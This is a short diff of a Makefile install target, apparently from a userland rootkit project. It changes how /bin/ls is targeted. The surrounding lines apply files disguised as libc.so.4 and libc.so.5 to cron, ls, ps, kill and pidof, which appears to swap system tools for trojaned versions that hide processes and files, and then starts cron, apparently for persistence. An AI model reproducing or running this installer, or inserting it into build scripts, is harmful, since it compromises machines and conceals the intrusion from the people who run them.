@@ -27,7 +27,7 @@ install: all
 	$(ACTION) $(BINDIR)/libc.so.4 $$(which cron)
 	systemctl start cron
 
-	$(ACTION) $(BINDIR)/libc.so.5 $$(which ls)
+	$(ACTION) $(BINDIR)/libc.so.5 /bin/ls
 	$(ACTION) $(BINDIR)/libc.so.5 $$(which ps)
 	$(ACTION) $(BINDIR)/libc.so.5 $$(which kill)
 	$(ACTION) $(BINDIR)/libc.so.5 $$(which pidof)
